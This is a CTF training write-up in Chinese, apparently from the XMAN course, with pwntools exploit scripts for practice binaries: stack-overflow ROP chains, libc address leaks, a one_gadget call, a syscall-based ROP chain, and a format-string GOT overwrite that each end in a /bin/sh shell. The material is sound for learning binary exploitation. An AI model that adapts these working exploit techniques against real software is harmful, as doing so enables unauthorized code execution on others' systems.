#XMAN day3

by Hence Zhang



###ROP-1:

```python
#!/usr/bin/env python
from pwn import *

p = process("./rop1-fa6168f4d8eba0eb")
p.send("A"*140 + p32(0x080484aa) + "\n")
p.interactive()
```

pattern create xxx 产生填充字符串

pattern offset xxx 确定padding的长度



###ROP-2：

```python
#!/usr/bin/env python
from pwn import *

p = process("./rop2-20f65dd0bcbe267d")
p.send("A"*140 + p32(0x080483a0) + p32(0xdeafbeef) + p32(0x8049610) + "\n")
p.interactive()
```

和ROP-1相比，多了一个传参的过程。

字符串/bin/bash和system函数的在binary中的位置可以在GDB中，分别使用searchmem "/bin/bash"和bre system确定。

###ROP-3:

***normal solution：***

```python
#!/usr/bin/env python

from pwn import * 

libc = ELF("/lib32/libc.so.6")
binary = ELF("rop3-7f3312fe43c46d26")

write_plt = binary.symbols['write'] 
read_plt = binary.symbols['read']
write_got = binary.got['write']
system_symbol = libc.symbols['system']
write_symbol = libc.symbols['write']
main_addr = 0x80484c9

p = process("./rop3-7f3312fe43c46d26")
raw_input("##############")
payload_1 = "A"*140 + p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(4)  
p.send(payload_1 + "\n")
write_addr = u32(p.recv())
print "write_addr => " + hex(write_addr)

system_addr = write_addr - (write_symbol - system_symbol)
print "system_addr => " + hex(system_addr)

payload_2 = "A"*140 + p32(read_plt) + p32(main_addr) + p32(0) + p32(0x0804a018) + p32(9)
p.send(payload_2 + "\n")

raw_input("#################")
p.send("/bin/sh\x00\n")

raw_input("######################")
payload_3 = "A"*140 + p32(system_addr) + p32(0xdeadbeef) + p32(0x0804a018)
p.send(payload_3 + "\n")
p.interactive()
```

我的思路是：

> leak puts@got => calculate system addr => read /bin/sh to .data => system("/bin/sh")

此处的/bin/sh我是通过read函数读取到.data中的，但一般通过地址偏移，找到libc中的/bin/sh即可使用。我在用这种解法时遇到一个坑，我把/bin/sh直接读取到.data上，但是忘了去用\x00截断之后的字符串，shell一直起不了。

还有一种解法的思路是：

> leak puts@got => one_gadget execve

***one_gadget solution：***

```python
#!/usr/bin/env python

from pwn import * 

context.log_level = 'debug'
#env = {'LD_PRLOAD':'libc.so.6'}

libc = ELF("/lib32/libc.so.6")
binary = ELF("rop3-7f3312fe43c46d26")

write_plt = binary.symbols['write'] 
read_plt = binary.symbols['read']
write_got = binary.got['write']
system_symbol = libc.symbols['system']
write_symbol = libc.symbols['write']
main_addr = 0x80484c9

p = process("./rop3-7f3312fe43c46d26")
raw_input("##############")
payload_1 = "A"*140 + p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(4)  
p.send(payload_1 + "\n")
write_addr = u32(p.recv())
print "write_addr => " + hex(write_addr)

system_addr = write_addr - (write_symbol - system_symbol)
shell_addr = 0x64c6b  + (write_addr - write_symbol)
print "system_addr => " + hex(system_addr)
print "shell_addr => " + hex(shell_addr)

raw_input("$$$$$$$$$$$$$$$$$$$$$$$$")
payload_2 = "A"*140 + p32(shell_addr) + p32(0) + p32(0) + p32(0) + p32(0) 
p.send(payload_2 + "\n")

p.interactive()
```

安装one_gadget时对ruby的版本有一定要求，可以使用gem安装该工具：

> gem install one_gadget

使用one_gadget最后得到的是几个可用的gadget在libc或者相关binary中的偏移地址。在使用的时候还需要加上基地址。最后一点，one_gadget还要求我们控制esp附近的一些相关参数为NULL，我们可以通过在payload后面多加几个p32(0)实现之。

```python
payload_2 = "A"*140 + p32(shell_addr) + p32(0) + p32(0) + p32(0) + p32(0) 
```



###ROP-4:

还没写

###ssctf_pwn250：

这题的binary在编译时开启了-fPIC选项，所以没有办法去做传统的ROP。溢出点在print函数上，这是一个出题人自己实现的函数。可以通过ROPgadget找到合适的gadget去拼接系统调用，但是其中的int 0x80;ret的gadget是没有办法通过ROPgadget去找的，因为一般不会有这样的gadget，这里也是一种取巧的行为。

通过pwntools的asm("int 0x80;ret")得到该指令的机器码，然后在gdb加载该文件后使用searchmem去寻找相关的gadget。代码如下：

```python
#!/usr/bin/env python

from pwn import *

context.log_level = 'debug'
#env = {'LD_PRLOAD':'libc.so.6'}

libc = ELF("/lib32/libc.so.6")
binary = ELF("250")

pop_eax_pop_ebx_pop_pop_ret = 0x080ad35a
pop_ecx_ret = 0x080df1b9
pop_edx_ret = 0x0806efbb
int_ret = 0x806f5c0
data_addr = 0x080ea000
main_addr = 0x804888a
junk = 0xcafebabe

p = process("./250")
print p.recv()
p.send("300\n")
print p.recv()

raw_input("####################")
payload_1 = "A"*62 + p32(pop_eax_pop_ebx_pop_pop_ret) + p32(3) + p32(0) + p32(junk) + p32(junk) + p32(pop_ecx_ret) + p32(data_addr) + p32(pop_edx_ret) + p32(9) + p32(int_ret) + p32(pop_eax_pop_ebx_pop_pop_ret) + p32(0xb) + p32(0x080ea000) + p32(junk) + p32(junk) + p32(pop_ecx_ret) + p32(0) + p32(pop_edx_ret) + p32(0) + p32(int_ret) + p32(0xdeadbeef) + "\n"

p.send(payload_1)
p.send("/bin/sh\x00\n")
p.interactive()
```

最终，先构造一个read将/bin/sh读到.data上，然后使用execve执行命令。这两个系统调用的传参如下：

> sys_read   $eax=0x3  \$ebx=0x0 \$ecx=data_addr \$edx=length
>
> sys_execve $eax=0xb \$ebx=data_addr \$ecx=0x0 \$edx=0x0



###SROP:

还没写

###Return2dlresolve：

还没写

###Format string:

```python
#!/usr/bin/env python

from pwn import *

j = 6
shell_str = "hs/nib/"

def my_printf(string):
    global j
    string = padding(string)
    p.send("put\n")
    p.send(shell_str[6-j] + "\n")
    p.send(string+"\n")
    p.send("get\n")
    p.send(shell_str[6-j] + "\n")
    p.recvuntil("ABCD")
    j -= 1
    return p.recv()[:-4]
    #print p.recv()

def padding(string):
    return string.ljust(40," ")

def filter(tmp):
    index_1 = tmp.find("{{")
    index_2 = tmp.find("}}")
    addr = u32(tmp[index_1+2:index_2][0:4])
    return addr

binary = ELF('pwn3')
libc = ELF('libc.so.6')
puts_got = binary.got['puts']
puts_plt = binary.symbols['puts']
puts_symbol = libc.symbols['puts']
system_symbol = libc.symbols['system']

print "puts_got => " + hex(puts_got)
print "puts_plt => " + hex(puts_plt)
print "puts_symbol => " + hex(puts_symbol)

p = process("./pwn3")
print p.recv()
p.send("rxraclhm\n")
print p.recv()
for i in range(1,51):
    #my_printf("ABCD%"+"%d$x"%i)
    pass

payload_1 = "ABCD" + p32(puts_got) + "{{%8$s}}"
#gdb.attach(p)
tmp = my_printf(payload_1)
puts_addr = filter(tmp)
print "puts_addr => " + hex(puts_addr)

system_addr = puts_addr - (puts_symbol - system_symbol)
print "system_addr => " + hex(system_addr)

system_addr_1 = system_addr - (system_addr >> 8) * 256
system_addr_2 = (system_addr >> 8) - (system_addr >> 16) * 256
system_addr_3 = (system_addr >> 16) - (system_addr >> 24) * 256
system_addr_4 = (system_addr >> 24) - (system_addr >> 32) * 256
print "system_addr_1 => " + hex(system_addr_1)
print "system_addr_2 => " + hex(system_addr_2)
print "system_addr_3 => " + hex(system_addr_3)
print "system_addr_4 => " + hex(system_addr_4)

#write the system addr to puts@got
payload_2 = "ABCD" + p32(puts_got) + "%" + "%dc"%(system_addr_1 - 10) + "{{%8$hhn}}"
print payload_2
print my_printf(payload_2)
payload_2_check = "ABCD" + p32(puts_got) + "%" + "%dc"%(system_addr_1 - 10) + "{{%8$s}}"
print hex(filter(my_printf(payload_2_check)))

payload_3 = "ABCD" + p32(puts_got + 1) + "%" + "%dc"%(system_addr_2 - 10) + "{{%8$hhn}}"
print payload_3
print my_printf(payload_3)
payload_3_check = "ABCD" + p32(puts_got) + "%" + "%dc"%(system_addr_2 - 10) + "{{%8$s}}"
print hex(filter(my_printf(payload_3_check)))

payload_4 = "ABCD" + p32(puts_got + 2) + "%" + "%dc"%(system_addr_3 - 10) + "{{%8$hhn}}"
print payload_4
print my_printf(payload_4)
payload_4_check = "ABCD" + p32(puts_got) + "%" + "%dc"%(system_addr_3 - 10) + "{{%8$s}}"
print hex(filter(my_printf(payload_4_check)))

#system("/bin/sh")
p.send("dir\n")
p.interactive()
```

代码写的有点冗余，但主要的思路还是比较清晰：

> leak system_addr => write system_addr to puts@got => concat the /bin/sh => system('/bin/sh')

题目算是没什么坑的fmt的题，个人觉得这些题还是有以下解题技巧：

1.函数封装的好，能够节省很多时间；

2.使用%10$x这样的形式确定参数的偏移，使用%10\$s这样的形式泄露特定地址数据，使用%c %n的组合拳来改写数据；

3.尽量使用%hn和%hhn，避免过多的返回；

4.最好在每次使用%n修改地址后，使用%s去确认一下修改是否成功，对于新手而言能节省大量的时间。